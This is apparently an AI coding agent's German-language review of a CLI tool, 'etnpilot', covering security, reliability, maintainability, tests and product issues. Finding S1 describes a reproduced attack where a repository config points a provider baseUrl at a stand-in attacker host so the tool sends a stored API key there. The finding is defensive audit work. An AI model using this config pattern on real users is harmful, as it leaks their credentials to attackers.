## Gesamturteil

Die Architektur ist ungewöhnlich sorgfältig für ein Projekt dieser Größe: begrenzte Lesevorgänge,
atomare Schreibvorgänge, Allow-Listen statt Deny-Listen, Evidenz statt Behauptung. Die Schwächen
liegen **nicht** in Schlampigkeit im Kleinen, sondern an drei Stellen im Großen:

1. **Es gibt kein Vertrauensmodell für ein fremdes Repository.** Die Konfiguration eines Repos ist
   Autorität (Provider-URLs, Secret-Zuordnung, Befehle). Wer ein fremdes Repo klont und `etnpilot`
   darin ausführt, führt dessen Konfiguration aus. Mit dem neuen Login-Speicher ist daraus ein
   **belegter Schlüsselabfluss** geworden (S1).
2. **Die Oberfläche (5 400 Zeilen Client-JavaScript in Template-Strings) hat kein Netz** aus Lint,
   Typen und Browser-Test in der CI. Alles Visuelle ist nur von Hand geprüft.
3. **Die Dokumentation läuft dem Code hinterher.** README und CHANGELOG kennen weder Import,
   Forge, benannte Workflows, Responses-API, Login noch Smoke.

## 1. Sicherheit

### S1 — Gespeicherte Zugangsdaten gehen an beliebige Hosts · **Hoch** · von mir eingeführt bzw. verschärft

**Beleg (reproduziert):** Ein Test-Repo ohne `secrets`-Abschnitt, nur mit
`providers.evil.baseUrl: http://attacker/v1` und `apiKeySecret: openai.apiKey`, plus ein
gespeicherter OpenAI-Key im Login-Speicher. `etnpilot smoke` sendet
`Authorization: Bearer sk-…` an den Angreifer-Server. Das Skript lag im Sitzungs-Scratchpad (nicht im Repo); die Ausgabe zeigte den vollständigen
Schlüssel im Header des Angreifer-Servers. Ich nehme es auf Wunsch als Test auf.

**Ursache:** `SecretResolver.get()` (`src/secrets/resolver.js:40`) fragt den Login-Speicher
(`stored()`, Zeile 58) für **jeden** Secret-Namen, auch wenn das Projekt ihn weder in
`secrets.values` zugeordnet noch in der Allow-Liste der Umgebung freigegeben hat. Die Allow-Liste
(`init.js` → `secrets.providers.env.allow`) sollte genau das verhindern; der Speicher umgeht sie.
Der Provider schickt den Schlüssel an die `baseUrl` aus derselben Repo-Datei. Das gilt für
`anthropic`, `openai-compatible`, `gitlab.apiToken` (→ `git.baseUrl`) und `github.token`.

**Einordnung:** Ganz neu ist die Klasse nicht — ein feindliches Repo kann auch
`openai.apiKey → env OPENAI_API_KEY` selbst zuordnen und freigeben. Aber mit dem Speicher
braucht es dafür nichts mehr, und der Speicher macht die Schlüssel dauerhaft verfügbar, nicht nur
in der gerade geöffneten Shell. Das ist meine Änderung aus PR #33 und hätte dort auffallen müssen.

**Vorschlag (in dieser Reihenfolge):**
1. **Host-Bindung:** Jeder gespeicherte Eintrag trägt die Hosts, für die er gilt
   (`api.openai.com`, `api.anthropic.com`, `github.com`/`api.github.com`, der GitLab-Host, mit
   dem angemeldet wurde). Beim Einsetzen des Schlüssels prüft `register.js`/`GitLabClient` den Host
   der `baseUrl`. Passt er nicht, wird der Eintrag **nicht** geliefert, mit einer Meldung, die den
   fremden Host nennt. Das gilt auch für Umgebungsvariablen, wenn der Name zu einem bekannten
   Dienst gehört.
2. Der Speicher antwortet nur für Namen, die das Projekt **deklariert** (`secrets.values`), oder
   für die fest eingebauten Standardnamen — nie für beliebige.
3. Test: das Experiment oben als Regressionstest.

### S2 — Kein Vertrauensmodell für fremde Repos · **Hoch**

`etnpilot run|check|doctor|forge|smoke|chat` in einem frisch geklonten Repo liest dessen
`.etnpilot/etnpilot.yaml` und befolgt es: Provider-URLs, Secret-Zuordnungen, `checks` (Shell-Befehle),
Plugins, Sandbox an/aus. Content-Provenance sperrt Agents/Prompts/Skills, **nicht** die Konfiguration
selbst. Ein Repo kann also eigene Checks und eigene Provider mitbringen.

**Vorschlag:** Beim ersten Öffnen eines Projekts auf diesem Rechner (Fingerprint der Config) einmal
fragen: „Dieses Projekt hat Provider-URLs X, Checks Y, Plugins Z. Vertrauen?“ — mit Merkliste im
Benutzerverzeichnis. Nicht vertraut = nur lesende Befehle (`doctor`, `ui` zum Ansehen). Das ist
dasselbe Muster wie Ordner-Vertrauen in Editoren und schließt S1 an der Wurzel.

### S3 — Web-Seite ohne Host-Prüfung und ohne Frame-Schutz · Niedrig–Mittel

- `src/ui/server.js` prüft den `Host`-Header nicht (nur Token). Gegen DNS-Rebinding schützt heute
  das Token (SameSite=Strict-Cookie gilt nicht für die Angreifer-Domain), aber ein Host-Allowlist-
  Check (`127.0.0.1`, `localhost`, die ausdrücklich freigegebene LAN-Adresse) ist billige
  Tiefenverteidigung.
- Die HTML-Antwort (`html()`, Zeile ~573) setzt eine gute CSP, aber **kein**
  `frame-ancestors 'none'`/`X-Frame-Options`. Das Cookie ist SameSite=Strict, also bisher nicht
  ausnutzbar — trotzdem ein Einzeiler.
- Das Token steht in der URL (`?token=`). Es landet im Browserverlauf und in Terminal-Scrollback.
  `Referrer-Policy: no-referrer` ist gesetzt (gut). Vorschlag: nach dem ersten Aufruf per Redirect
  auf eine URL ohne Query umstellen (das Cookie trägt dann weiter).
- `--host` für LAN-Betrieb ist reines HTTP. Das Token liegt dort im Klartext im Netz. Die Doku
  sagt es; ein SSH-Tunnel-Hinweis steht im Start-Text. Vorschlag: bei Nicht-Loopback-Host eine
  deutliche Warnzeile bei jedem Start.

### S4 — Accounts-API nimmt vom Client einen Host entgegen · Niedrig

`src/ui/accounts.js:31,41`: `host` aus dem Request-Body bestimmt, wohin der Server Token/Client-ID
schickt. Nur mit gültigem UI-Token erreichbar, also gleiche Macht wie sonst — aber ein Server, der
auf Zuruf beliebige Hosts anspricht, ist ein SSRF-Muster. Vorschlag: nur `https://`, keine
Loopback-/Link-Local-Ziele außer ausdrücklich per Konfiguration.

### S5 — Login-Speicher im Klartext · Niedrig (bewusst, aber benennen)

`~/.config/etnpilot/credentials.json`, Rechte 0600, atomar. Auf Android/Termux ist das
Standard-Niveau (kein Schlüsselbund). Zwei Folgen: (a) jeder **genehmigte** Shell-Befehl ohne
Sandbox kann die Datei lesen (`HOME` steht in der Umgebungs-Allow-Liste,
`src/runtime/command-environment.js:1`; die Sandbox ist per Vorlage **aus**, `init.js:275`; die
Regel `protect-credentials` schützt nur Dateien **im Projekt**). Die Genehmigung zeigt den
vollen Befehl, das ist der Schutz. (b) Windows ignoriert 0600. Vorschlag: `~/.config/etnpilot` in
die Deny-Liste der Lese-Regeln aufnehmen und in `docs/login.md` den Klartext ausdrücklich
nennen; optional OS-Schlüsselbund, wo vorhanden.

### S6 — Unsignierte Receipts sind der Standard · Mittel (Aussage vs. Wirklichkeit)

`receipts.signing.enabled: false` (`init.js:158`). Eine Hash-Kette ohne Signatur erkennt
Zufallsfehler und teilweises Verändern, **nicht** das komplette Neuschreiben durch jemanden mit
Dateizugriff. Das Produkt wirbt mit „proof-carrying execution“. Vorschlag: im README klar
trennen („Integrität“ vs. „Herkunft“), die Vorlage `regulated` hervorheben und `doctor` eine
Warnzeile ausgeben lassen, solange nicht signiert wird.

### S7 — `LD_PRELOAD` in der Umgebungs-Allow-Liste · Niedrig

`command-environment.js:2` reicht `LD_PRELOAD`/`LD_LIBRARY_PATH` an Kindprozesse durch (für
Termux nötig). Das ist begründet, aber es ist eine Ausnahme von „Allow-Liste“, die nur dort
gelten sollte, wo `PREFIX` gesetzt ist. Vorschlag: plattformabhängig machen.

## 2. Zuverlässigkeit und Datenhaltung

### Z1 — Token-Erneuerung: Verlust des Refresh-Tokens und Wettlauf · Mittel · von mir

`src/auth/credential-store.js:65`: `await this.write(data).catch(() => {})` verschluckt einen
Schreibfehler **nach** erfolgreicher Erneuerung. GitLab-Refresh-Tokens sind Einmal-Tokens: Geht das
neue verloren, ist beim nächsten Mal nur noch das verbrauchte da, die Anmeldung ist tot, und der
Fehler war stumm. Zusätzlich gibt es keine Sperre: UI und CLI können gleichzeitig erneuern, einer
verbraucht das Token, der andere scheitert und überschreibt ggf. mit altem Stand.
**Vorschlag:** Schreibfehler weiterreichen (und den frischen Token trotzdem für diesen Aufruf
benutzen); eine einfache Lock-Datei (`wx`-Flag, kurze Frist) um Lesen→Erneuern→Schreiben; bei
`invalid_grant` den Eintrag als „abgelaufen — bitte neu anmelden“ markieren statt still `undefined`
zu liefern.

### Z2 — Fehler werden im Zweifel verschluckt · Mittel

Gut 60 Stellen mit leerem `catch {` (dazu viele `.catch(() => …)`), davon viele berechtigt (best effort), aber die Dichte
macht Fehlersuche schwer. Beispiele, die ich schärfer fassen würde: das eben genannte `write`;
`readContentReview(...).catch(() => ({ items: [] }))` in `project-content.js` (ein kaputter
Content-Ordner sieht dann aus wie „leer“); `fetchImpl`-Fehler in `verifyCredential` werden zu
„unreachable“ ohne Ursache im Log. **Vorschlag:** ein kleiner `swallow(reason)`-Helfer, der in
`ETNPILOT_DEBUG=1` die Ursache auf stderr schreibt; die genannten Stellen zuerst umstellen.

### Z3 — Telemetrie wächst unbegrenzt · Niedrig–Mittel

Die Telemetrie-Datei wird bei jeder Zusammenfassung vollständig gelesen
(`summarizeTelemetryFile`), eine Rotation gibt es nicht (`grep rotate` → nur ein Kommentar zu
Modellnamen). Bei täglicher Nutzung auf dem Handy wird das spürbar. **Vorschlag:** Rotation nach
Größe (z. B. 5 MB → `.1`) plus Zusammenfassungen, die Rotationsdateien einbeziehen; oder ein
Tagesaggregat.

### Z4 — Inhalt wird pro Ansicht komplett neu erfasst · Niedrig

`readContentFile` ruft `captureProjectContent` für **eine** Datei auf und liest dabei alle
(`project-content.js:97`). Bei großen Projekten und Handy-Speicher unnötig. Vorschlag: Pfad
direkt auflösen (mit derselben Eingrenzung wie jetzt) statt alles zu erfassen.

### Z5 — Läufe aus der UI leben im Serverprozess · Niedrig (bekannt)

Beendet das Betriebssystem die App im Hintergrund (Termux), stirbt der Lauf mit. Der CHANGELOG
erwähnt das. Vorschlag: Fortsetzen nach Neustart ausdrücklich anbieten (die Warteschlange hat
das Gerüst) und beim Start „unterbrochener Lauf“ anzeigen.

## 3. Wartbarkeit

### W1 — Große Dateien und Verzweigungsketten · Mittel

`project-state.js` 1 135 Zeilen, `tui/render.js` 1 105, `project-runner.js` 1 019,
`workspace-tools.js` 904, `cli/commands.js` 878 mit einer Kette von **46** `else if (command === …)`.
Die Client-Module wurden auf ≤ 800 Zeilen begrenzt, die Server-Module nicht. Vorschlag:
`commands.js` als Tabelle `{ name, usage, run }` in einem Verzeichnis `src/cli/commands/*.js`
(jede Datei ein Befehl); `project-state.js` nach Themen teilen (Runs, Inhalt, Chat, Lesezugriffe).
Der Nutzen ist vor allem Testbarkeit: heute lässt sich ein Befehl nur über `main()` ausprobieren.

### W2 — Oberfläche als Template-String-JavaScript · Mittel

5 400 Zeilen Client-Code stecken in Template-Literalen (`src/ui/page/*.js`): keine Syntaxhervorhebung,
kein Lint, keine Typen, globale `let`-Variablen über Module hinweg, und Regeln wie „keine
Backslashes/Backticks“ als Konvention. Das hat mir selbst mehrfach Fehler eingebracht (Escape-
Probleme, Klassennamen-Kollisionen). **Vorschlag:** Die Client-Module als echte `.js`-Dateien
unter `src/ui/client/` ablegen und beim Auslieferen per `readFile` einbetten (kein Build-Schritt
nötig; `npm run check` kann sie mit `node --check` prüfen und ein Lint laufen lassen). Das ist
mechanisch und riskiert wenig.

### W3 — Gemeinsamer Zustand zwischen Client-Modulen · Niedrig–Mittel

Funktionen wie `render()`, `show()`, Variablen wie `view`, `contentData`, `accountsData`, `accountBusy`
sind global; Reihenfolge der Module ist implizit (`page.js`). Vorschlag mit W2: ein kleines
Zustandsobjekt und explizite Registrierung der Ansichten (`registerView({id, render, load})`)
statt der Fallunterscheidungen in `draw()`, `show()` und `renderPageActions()`.

### W4 — Doppelter Code in den Prüfungen · Niedrig

`smoke.js`: die Schritte `tools` und `toolstream` wiederholen dieselben Prüfungen; `login.js` und
`accounts.js` wiederholen Host-Behandlung. Klein, aber leicht zu bündeln.

## 4. Tests und CI

### Q1 — CI prüft nur Syntax und Tests · Mittel

`npm run check` = `check-syntax.mjs` + `node --test`. Kein Lint, kein Format, kein Typcheck (der
frühere Vorschlag `// @ts-check` steht weiter offen), kein Coverage-Bericht (`coverage/` steht in
`.gitignore`, aber nichts erzeugt ihn). **Vorschlag in kleinen Schritten:** (1) `node --test
--experimental-test-coverage` in einem eigenen CI-Job als Information; (2) `// @ts-check` +
`tsc --noEmit` für `src/auth`, `src/secrets`, `src/runtime/smoke.js`, `src/forge` (reine
Dev-Abhängigkeit); (3) ESLint mit einer kleinen Regelmenge (`no-unused-vars`, `no-empty`,
`eqeqeq`).

### Q2 — Kein Browser-Test im Repo · Mittel

Die Oberfläche wurde von mir mit Playwright geprüft, aber **Playwright steht weder in
`package.json` noch in `package-lock.json`** — es liegt nur in dieser Sandbox. Die Skripte sind
nicht im Repo, die Prüfung ist für niemand sonst wiederholbar. Vorschlag: ein optionaler Job
`npm run test:ui` (Playwright als `devDependency`, nicht in `npm ci` des Standard-Jobs), mit 5–6
Fluss-Tests: Start, Content sperren, Workflow bauen, Konto verbinden (mit Fake-Dienst), 412-px-
Layout ohne horizontales Scrollen.

### Q3 — Ein schwankender Test · Niedrig

`test/…` „a conversation: two messages, the second remembers the first, /exit leaves“ (PTY) schlug
mehrfach unter Last fehl und lief bei Wiederholung durch. Kein Zeichen von Fehlern im Code, aber ein
Vertrauensverlust in rote CI. Vorschlag: Wartebedingungen statt fester Pausen (auf Ausgabe warten
statt `sleep`), Zeitlimit großzügiger.

### Q4 — Live-Wahrheit fehlt · Mittel (teilweise behoben)

Alle Provider-Tests laufen gegen Attrappen. `etnpilot smoke` (neu) schließt das für OpenAI, und der
erste echte Lauf war grün — aber für Anthropic, GitLab-Veröffentlichung und die Device-Flows gibt es
**keine** Live-Evidenz (`docs/first-real-run.md` führt GitLab selbst als offen). Vorschlag: `smoke`
um `--gitlab` erweitern (Projekt lesen, Branch anlegen und löschen) und einen manuellen
„Live“-Workflow in der CI mit Geheimnissen des Maintainers (nur auf Knopfdruck).

## 5. Produkt und Bedienung

### P1 — GitHub-Login hat auf dem Handy keinen Abnehmer · Mittel · von mir

Der einzige Verbraucher von `github.token` ist der Copilot-Provider (`register.js:13`), und
dessen SDK gibt es für Android nicht (`copilot.js:8`, `COPILOT_PLATFORMS`). Auf der Hauptplattform
des Nutzers verbindet „Sign in with GitHub“ also etwas, das nichts benutzt. Außerdem ist unsicher,
ob ein Device-Flow-Token einer eigenen OAuth-App von Copilot überhaupt akzeptiert wird (Scope
`read:user` ist vermutlich zu eng). **Vorschlag:** Entweder einen Provider „GitHub Models“
(OpenAI-kompatibel, `models.github.ai/inference`) ergänzen, der dieses Token benutzt — dann hat der
Login einen Zweck —, oder die Karte in der Oberfläche mit einem Hinweis versehen, wofür sie
gebraucht wird.

### P2 — Ersteinrichtung braucht OAuth-App · Niedrig–Mittel

Browser-Login geht nur mit selbst angelegter OAuth-App (GitHub/GitLab). Für einen Einzelnutzer ist
ein Token oft einfacher; die Oberfläche bietet beides, die Reihenfolge („Sign in“ zuerst, Token
eingeklappt) betont aber den komplizierteren Weg. Vorschlag: Wenn keine Client-ID bekannt ist, das
Token-Feld zuerst zeigen.

### P3 — Preisliste mit geratenen Modell-IDs · Mittel

`known-pricing.js` enthält außer `gpt-6-luna` Einträge, deren IDs aus einer eingefügten Tabelle
geraten wurden. Die Preisaktualisierung über OpenRouter ersetzt das teilweise, aber Kosten sind
ein Vertrauensthema (0,2483 vs. 0,21 USD gegenüber dem Dashboard ist weiter ungeklärt).
Vorschlag: im Bericht jedes Preises die **Quelle** (`tabelliert`/`gelernt`/`geschätzt`) anzeigen —
die Daten sind schon da (`rate.source`) — und den Abgleich als Befehl `etnpilot usage compare`
(zeigt Tokens je Modell, damit man sie mit dem Dashboard abgleichen kann).

### P4 — Forge schreibt, was später geprüft werden muss · Niedrig

Der erste echte Lauf legte Agents an, die vorhandene doppelten (jetzt gemindert). Vorschlag:
`etnpilot forge --preview` (anzeigen ohne schreiben, mit Rückfrage), damit das Modell nicht erst
Dateien erzeugt, die dann gelöscht werden.

### P5 — Meldungen und Sprache · Niedrig

Oberfläche und CLI sind englisch, Nutzer und Doku-Gespräche deutsch. Wenn gewünscht: ein
`ui.language`-Schalter mit einer kleinen Textdatei pro Sprache ist mit W2 gut machbar. Kein
Muss.

## 6. Abhängigkeiten und Betrieb

- **Laufzeit:** Node ≥ 22.13, `node:sqlite` ist weiter *experimental* (die Warnung wird nur in
  Vollbild-Ansichten unterdrückt). Jede Node-Hauptversion kann die API ändern; die CI-Matrix (22/24/26)
  fängt das früh. Gut. Vorschlag: einen Test, der das Schema der SQLite-Dateien festhält
  (Migrationen), bevor Nutzerdaten wachsen.
- **Abhängigkeiten:** `yaml`, `@colbymchenry/codegraph` (schwer, native Teile; auf Android gab es
  Probleme), optional `@github/copilot-sdk`. Wenige Abhängigkeiten sind ein Vorteil; die CodeGraph-
  Einbindung ist die größte Betriebsunsicherheit (siehe `UPSTREAM.md`, `docs/architecture.md`).
- **Veröffentlichung:** `private: true`, Version 0.1.0, kein `files`-Feld. Wer es installiert,
  nutzt Clone + Link. Wenn es weitergegeben werden soll: `files`, `npm pack`-Test in der CI,
  Versionierung mit dem CHANGELOG.
- **`upstream/` / `UPSTREAM.md`:** Das Submodul `agentwerk` soll nicht importiert werden. Ein Test, der
  das erzwingt (`grep` in `src` auf `upstream/`), kostet nichts.
